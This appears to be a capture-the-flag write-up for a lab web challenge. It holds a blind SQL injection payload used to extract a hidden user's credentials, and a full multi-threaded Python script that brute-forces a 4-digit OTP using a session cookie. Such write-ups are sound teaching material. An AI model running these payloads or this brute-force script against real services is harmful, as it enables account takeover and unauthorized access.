The challenge page has lots of interesting functionality such as the ability to make accounts, make listings, making drafted listings only accessible via a 4 digit OTP.  The important functionality here is the ability to search for listings, which results in the following type of requests
```
GET /?q=test HTTP/1.1
Host: 10.0.168.128:5000
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.168.128:5000/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
Upon further investigation one can find that the url query parameter `q` has a SQL injection bug in it, also notice that when you create an account the user id assigned to you as you can see from the flask tokens is 10, you also see 8 users on the listing page, thus their is a hidden 9th user. 
```
zzz') OR (length((SELECT username FROM users WHERE id=9)) >= 4)--
```
Using the following SQLi payload one can find that the username is 4 letters long, using similar SQLi using the substr() function, we can find both the username and password of the 9th user to be as follows
```
Username: Zuko
Password: i-HaVe-REgaINEd_mY_h0NOr!
```
Logging in using the username and password, we see that they have a singular unlisted draft protected by a OTP, brute-forcing this OTP using the following multi-threaded python script
```
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import sys
import time

URL = "http://10.0.173.137:5000/account/unlisted/unlock"

SESSION = (
    "eyJwYXNzd29yZF92ZXJpZmllZCI6ZmFsc2UsInVzZXJfaWQiOjl9."
    "aq5Png.1MQf7JQ4uKx9N0hwmDFqI29b6gk"
)

LOCK_STATE = "eyJ2IjoxLCJ1Ijo5LCJuIjowfQ"

ERROR_TAG = '<p class="error">Invalid seller-lock PIN</p>'

WORKERS = 50

local = threading.local()
print_lock = threading.Lock()

total = 10000
completed = 0
start = time.time()


def get_session():
    if not hasattr(local, "session"):
        s = requests.Session()

        s.headers.update({
            "Cache-Control": "max-age=0",
            "Accept-Language": "en-GB,en;q=0.9",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/151.0.0.0 Safari/537.36",
            "Origin": "http://10.0.173.137:5000",
            "Referer": "http://10.0.173.137:5000/account/unlisted",
        })

        s.cookies.set("session", SESSION)

        local.session = s

    return local.session


def try_pin(number):
    pin = f"{number:04d}"

    try:
        r = get_session().post(
            URL,
            data={
                "lock_state": LOCK_STATE,
                "pin": pin,
            },
            allow_redirects=False,
            timeout=10,
        )

        has_error_tag = ERROR_TAG in r.text

        return {
            "pin": pin,
            "status": r.status_code,
            "has_tag": has_error_tag,
            "length": len(r.content),
            "location": r.headers.get("Location", ""),
            "body": r.text,
        }

    except requests.RequestException as e:
        return {
            "pin": pin,
            "status": "ERR",
            "has_tag": False,
            "length": 0,
            "location": "",
            "body": str(e),
        }


with ThreadPoolExecutor(max_workers=WORKERS) as executor:

    futures = [
        executor.submit(try_pin, i)
        for i in range(total)
    ]

    for future in as_completed(futures):

        result = future.result()
        completed += 1

        elapsed = time.time() - start
        rate = completed / elapsed if elapsed else 0

        if result["has_tag"]:
            verdict = "INVALID CODE"
        else:
            verdict = "NO INVALID-PIN TAG"

        with print_lock:

            print(
                f"pin: {result['pin']}, "
                f"response: {result['status']}, "
                f"html_tag: {verdict}"
            )

            if result["location"]:
                print(
                    f"    redirect: {result['location']}"
                )

            # Scrolling progress line
            sys.stdout.write(
                f"\rProgress: {completed}/{total} "
                f"({completed / total * 100:.2f}%) | "
                f"{rate:.1f} req/s"
            )
            sys.stdout.flush()

            # If the exact invalid-PIN tag is absent,
            # dump the response so you can inspect it.
            if not result["has_tag"]:
                print("\n")
                print("=" * 70)
                print(f"POSSIBLE HIT: {result['pin']}")
                print(f"HTTP: {result['status']}")
                print(f"Length: {result['length']}")
                print("=" * 70)
                print(result["body"][:5000])
                print("=" * 70)

                # Stop here.
                executor.shutdown(wait=False, cancel_futures=True)
                break

print("\nDone.")
```
> Yes its vibe coded :).

We get the required OTP, the unlisted draft has the following image,
![flag.png](flag.png)
Which is the flag!
